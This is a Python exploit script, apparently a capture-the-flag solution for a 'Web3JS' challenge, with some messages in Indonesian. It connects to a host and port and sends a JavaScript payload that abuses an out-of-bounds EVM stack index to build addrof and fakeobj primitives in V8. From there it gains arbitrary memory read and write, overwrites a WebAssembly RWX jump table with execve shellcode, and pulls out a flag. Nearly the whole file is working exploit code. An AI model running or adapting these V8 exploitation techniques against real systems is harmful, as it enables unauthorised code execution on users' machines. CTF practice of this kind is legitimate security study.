#!/usr/bin/env python3
import argparse
import base64
import re
import socket
import sys
from urllib.parse import urlparse

# execve("/readflag", ["/readflag"], NULL)
SHELLCODE_HEX = (
    "4831d2488d3d1e00000052574889e648c7c03b0000000f05"
    "48c7c0e700000048c7c7010000000f052f72656164666c616700"
)

JS_TEMPLATE = r'''const cvt = new ArrayBuffer(8);
const f64 = new Float64Array(cvt);
const u64 = new BigUint64Array(cvt);

function f2u(x) {
  f64[0] = x;
  return u64[0];
}

function u2f(x) {
  u64[0] = BigInt.asUintN(64, x);
  return f64[0];
}

function le64(x) {
  x = BigInt.asUintN(64, x);
  let result = "";
  for (let i = 0n; i < 8n; i++) {
    result += Number((x >> (8n * i)) & 0xffn)
      .toString(16)
      .padStart(2, "0");
  }
  return result;
}

function addrof(object) {
  const vm = evm("00");
  vm.push(object);
  return BigInt(vm.stack(1)[0]);
}

const keepAlive = [];

function fakeobj(address) {
  // CALLDATACOPY 40 bytes into EVM memory offset 0x10.
  const vm = evm("6028600060103700");
  const fakeWord = le64(1n) + le64(address) + "00".repeat(24);
  vm.input(fakeWord);
  vm.run();

  // stack size = 1. get(1638) resolves to memory+0x10 because the
  // index is not checked before indexing backwards from the stack.
  vm.push(0);
  keepAlive.push(vm);
  return vm.get(1638);
}

// Stable maps from the supplied snapshot_blob.bin.
const DOUBLE_ARRAY_MAP = 0x0100d30dn;
const EMPTY_FIXED_ARRAY = 0x000007e5n;

const crafted = [
  u2f((EMPTY_FIXED_ARRAY << 32n) | DOUBLE_ARRAY_MAP),
  u2f((0x20n << 32n) | EMPTY_FIXED_ARRAY),
  13.37,
  14.47,
  15.57,
  16.67,
  17.77,
  18.87,
];

// The elements backing store starts 0x40 bytes before the tagged array.
const fakeArray = fakeobj(addrof(crafted) - 0x40n);

function setCageTarget(address) {
  // FixedDoubleArray data is read from elements+7. Point elements at addr-7.
  const compressedElements = BigInt.asUintN(32, address - 7n);
  crafted[1] = u2f((0x20n << 32n) | compressedElements);
}

function cageRead64(address) {
  setCageTarget(address);
  return f2u(fakeArray[0]);
}

function cageWrite64(address, value) {
  setCageTarget(address);
  fakeArray[0] = u2f(value);
}

// Turn a Uint8Array into native arbitrary write by replacing its raw data ptr.
const writer = new Uint8Array(0x100);
const writerAddress = addrof(writer) - 1n;
const originalDataPointer = cageRead64(writerAddress + 0x30n);

function nativeWrite(address, hexBytes) {
  cageWrite64(writerAddress + 0x30n, address);
  for (let i = 0; i < hexBytes.length / 2; i++) {
    writer[i] = parseInt(hexBytes.slice(i * 2, i * 2 + 2), 16);
  }
  cageWrite64(writerAddress + 0x30n, originalDataPointer);
}

// Minimal () -> i32 Wasm function.
const wasmBytes = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
  0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
  0x03, 0x02, 0x01, 0x00,
  0x07, 0x07, 0x01, 0x03, 0x72, 0x75, 0x6e, 0x00, 0x00,
  0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b,
]);

const wasmFunction = new WebAssembly.Instance(
  new WebAssembly.Module(wasmBytes)
).exports.run;

// Traverse:
// JSFunction -> SharedFunctionInfo -> WasmExportedFunctionData
// -> WasmInternalFunction -> WasmTrustedInstanceData.
const functionBase = addrof(wasmFunction) - 1n;
const cageBase = functionBase & ~0xffffffffn;

const sharedInfo =
  cageBase + (cageRead64(functionBase + 0x10n) & 0xffffffffn) - 1n;
const exportedData =
  cageBase + (cageRead64(sharedInfo) >> 32n) - 1n;
const internalFunction =
  cageBase + (cageRead64(exportedData + 0x10n) & 0xffffffffn) - 1n;
const trustedInstanceData =
  cageBase + ((cageRead64(internalFunction) >> 32n) & 0xffffffffn) - 1n;

// Raw executable jump-table pointer in WasmTrustedInstanceData.
const jumpTableStart = cageRead64(trustedInstanceData + 0x28n);

nativeWrite(jumpTableStart, "__SHELLCODE__");
wasmFunction();
'''


def build_payload() -> bytes:
    script = JS_TEMPLATE.replace("__SHELLCODE__", SHELLCODE_HEX)
    return base64.b64encode(script.encode()) + b"\n"


def parse_target(values: list[str]) -> tuple[str, int]:
    if len(values) == 2:
        return values[0], int(values[1])

    if len(values) != 1:
        raise ValueError("gunakan HOST PORT, HOST:PORT, atau URL")

    target = values[0].strip()
    if "://" in target:
        parsed = urlparse(target)
        if not parsed.hostname or not parsed.port:
            raise ValueError("URL harus menyertakan port")
        return parsed.hostname, parsed.port

    if target.startswith("["):
        host, _, tail = target[1:].partition("]:")
        if not tail:
            raise ValueError("format IPv6 harus [HOST]:PORT")
        return host, int(tail)

    host, separator, port = target.rpartition(":")
    if not separator:
        raise ValueError("target harus menyertakan port")
    return host, int(port)


def receive_available(sock: socket.socket, timeout: float) -> bytes:
    sock.settimeout(timeout)
    chunks: list[bytes] = []
    while True:
        try:
            data = sock.recv(65536)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
    return b"".join(chunks)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Web3JS exploit: EVM OOB -> V8 native ARW -> Wasm RWX shellcode"
    )
    parser.add_argument(
        "target",
        nargs="+",
        help="HOST PORT, HOST:PORT, nc://HOST:PORT, atau http://HOST:PORT",
    )
    parser.add_argument("--timeout", type=float, default=70.0)
    parser.add_argument(
        "--emit-js",
        metavar="PATH",
        help="simpan payload JavaScript untuk debugging lokal",
    )
    args = parser.parse_args()

    try:
        host, port = parse_target(args.target)
    except (ValueError, TypeError) as error:
        parser.error(str(error))

    script = JS_TEMPLATE.replace("__SHELLCODE__", SHELLCODE_HEX)
    if args.emit_js:
        with open(args.emit_js, "w", encoding="utf-8") as output:
            output.write(script)

    print(f"[*] Connecting to {host}:{port}")

    try:
        with socket.create_connection((host, port), timeout=10.0) as sock:
            sock.settimeout(5.0)
            banner = b""
            try:
                while b"base64" not in banner.lower() and len(banner) < 16384:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    banner += chunk
            except socket.timeout:
                pass

            sock.sendall(build_payload())
            response = banner + receive_available(sock, args.timeout)
    except (OSError, socket.timeout) as error:
        print(f"[-] Connection failed: {error}", file=sys.stderr)
        return 1

    text = response.decode("utf-8", errors="replace")
    print(text, end="" if text.endswith("\n") else "\n")

    match = re.search(r"NHNC\{[^\r\n}]*\}", text)
    if match:
        print(f"<FLAG>{match.group(0)}</FLAG>")
        return 0

    print("[-] Flag tidak ditemukan pada output.", file=sys.stderr)
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
